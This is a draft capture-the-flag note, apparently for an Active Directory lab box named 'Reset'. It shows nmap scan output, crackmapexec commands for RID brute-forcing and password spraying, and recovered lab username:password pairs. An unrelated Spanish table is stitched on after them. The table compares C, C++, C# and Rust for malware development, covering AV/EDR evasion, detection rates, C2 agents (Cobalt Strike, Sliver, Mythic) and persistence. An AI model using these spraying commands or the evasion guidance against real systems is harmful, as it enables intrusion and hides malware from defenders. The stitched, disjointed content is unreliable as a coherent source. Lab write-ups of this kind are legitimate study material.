---
title: Reset
draft: true
tags:
---

# Enumeration
```java
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-03 16:54:16Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T16:54:59+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=HayStack.thm.corp
| Not valid before: 2025-06-02T16:49:23
|_Not valid after:  2025-12-02T16:49:23
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: HAYSTACK
|   DNS_Domain_Name: thm.corp
|   DNS_Computer_Name: HayStack.thm.corp
|   DNS_Tree_Name: thm.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-03T16:54:20+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Netbios: `haystack.thm.corp`
Domain `THM.CORP`

user: `LILY ONEILL` pass: `ResetMe123!`

Credentials `LILY_ONEILL:ResetMe123!`

```bash
crackmapexec smb 10.10.21.244 -u 'none' -p '' --rid-brute | grep -E 'SidTypeUser' | awk '{print $6}'| sed 's/THM\\//g' > RIDUsers

crackmapexec smb 10.10.21.244 -u RIDUsers -p 'ResetMe123!' --continue-on-success   
```

Credentials `TABATHA_BRITT:marlboro(1985)`

Credentials `SHAWNA_BRAY:Password1@`

Credentials `CRUZ_HALL:Password2@`

Credentials `DARLA_WINTERS:Password3@`

| Aspecto / Lenguaje       | C                                                                                                                            | C++                                                                                                                    | C#                                                                                                                                                              | Rust                                                                                                                                                               |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Evasión AV/EDR**       | Binarios nativos básicos. Mediana detección sin ofuscación (packers, cifrado disponibles). APIS comunes revisadas.           | Similar a C. Ligeramente más detecciones si usa librerías STL/excepciones. Ejemplo: detectado en 8/67 AV.              | Ejecutables .NET (IL) suelen disparar AV si no se recompilan/obf. _dotnet build_ mejora evasión.                                                                | Bajas detecciones actuales (5/72 vs 21/72 en un caso). Binaro optimizado complica firmas. Ofuscación propia de LLVM.                                               |
| **Análisis de binarios** | Código máquina legible pero sin metadatos. Descompilación difícil (solo ensamblador).                                        | Fácil de analizar; filtra llamadas WinAPI y lógica clara (villaier en C++).                                            | Muy fácil: IL se decompila a código fuente (ILSpy). Contrapeso: cargas in-memory posibles.                                                                      | Muy difícil: optimizaciones avanzadas, control de flujo complejos. Binaros gruesos confunden descompiladores.                                                      |
| **Soporte frameworks**   | Puede usarse en BOF de Cobalt (limitado) y payloads externos (Metasploit,CsShellcode). Sin agentes estándar preconfigurados. | Cobalt Strike BOFs en C++ soportados. Metasploit/Sliver integran bien código C++ (DLLs, shellcode).                    | Muchos agentes y libs (.NET). Mythic: Apollo/Athena en C#. Cobalt Strike: _execute-assembly_ C#. Frameworks populares de persistencia en C#.                    | En crecimiento. Mythic tiene agentes en Rust (Thanatos). Bishop Fox: dropper en Rust que lanza Sliver. RaaS modernos (BlackCat) en Rust. Aún pocos agentes listos. |
| **Persistencia Windows** | Acceso directo WinAPI (RegSetValueEx, CreateService, etc.). Sin apoyo de librerías, pero alto control.                       | Igual que C. Bibliotecas STL no útiles aquí; típicamente usa WinAPI. Ej. inyecta código/refuerzo usando API avanzadas. | APIs .NET facilitan tareas: clases RegistryKey, ServiceController, WMI, etc. SharPersist (C#) implementa múltiples triggers. Ejecutable .NET reflexivo posible. | Mediante crates (ej. _winreg_). Ejemplo: payload Rust crea Run key y tarea programada. Totalmente posible pero menos plantillas listas.                            |
| **Portabilidad**         | Muy portable al recompilar. Limitado si usa código OS-específico.                                                            | Idem C: portable (p. ej. mediante `#ifdef` o bibliotecas multiplataforma).                                             | Con .NET Core/6: multiplataforma (Win/Linux/Mac). Ej: Mythic Athena C# opera en Win/Mac/Linux. Código Windows-only no es portable.                              | Excelente: Rust compila estático en múltiples plataformas. Ej: BlackCat RaaS multi-OS. Herramientas de cross-compilación consolidadas (cargo).                     |
| **Reputación/Sospecha**  | Lenguaje neutral. Binarios nativos “normales”. AVs reaccionan al comportamiento, no al lenguaje.                             | Neutro. Igual que C, aunque binarios más grandes (p. ej. con C++ runtimes) pueden levantar alertas heurísticas.        | Suelen levantar sospecha: muchos malwares .NET conocidos. Compilar con herramientas modernas baja la alerta.                                                    | Por ahora baja sospecha. Rust nuevo en malware, con bajas tasas de detección. AVs no suelen considerarlo sospechoso por sí mismo.                                  |